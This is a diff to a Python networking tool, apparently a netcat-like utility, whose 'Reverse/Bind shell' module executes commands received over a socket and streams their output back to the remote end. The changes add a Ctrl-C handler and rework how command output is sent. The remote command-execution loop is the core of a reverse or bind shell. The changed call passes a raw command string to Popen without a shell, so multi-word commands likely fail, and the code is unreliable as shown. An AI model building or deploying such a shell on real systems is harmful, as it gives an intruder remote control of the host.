@@ -1,6 +1,17 @@
 import subprocess
 import os
 import sys
+from signal import signal, SIGINT
+
+
+def sighandle(signum,frame):
+    print("Termination signal recieved.\nExiting.")
+    exit(1)
+
+signal(SIGINT,sighandle)
+
+
+
 
 
 #sender module
@@ -11,8 +22,9 @@ def send(client):
             client.sendall(data + "\n")
     except Exception as e:
         print("[-]FATAL: " + str(e))
+        
 
-#Receiving module
+#Receiver module
 def recv(client):
     while (True):
         try:
@@ -20,6 +32,7 @@ def recv(client):
         except Exception as e:
             print("[-]FATAL: " + str(e))
             sys.exit(-1)
+            
 
 #Reverse/Bind shell module
 def shell(conn):
@@ -42,9 +55,10 @@ def shell(conn):
                 conn.sendall("\n[+]Exiting shell mode..\n")
                 sys.exit(0)
         try:
-            output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
+            proc = subprocess.Popen(command,stdout=subprocess.PIPE)
             conn.sendall("[*]Executing..\n\n")
-            conn.sendall(output)
+            while proc.poll() is None:
+                conn.sendall(proc.stdout.readline())
             conn.sendall("> ")
         except Exception as e:
             conn.sendall("[-]" + str(e) + "\n")
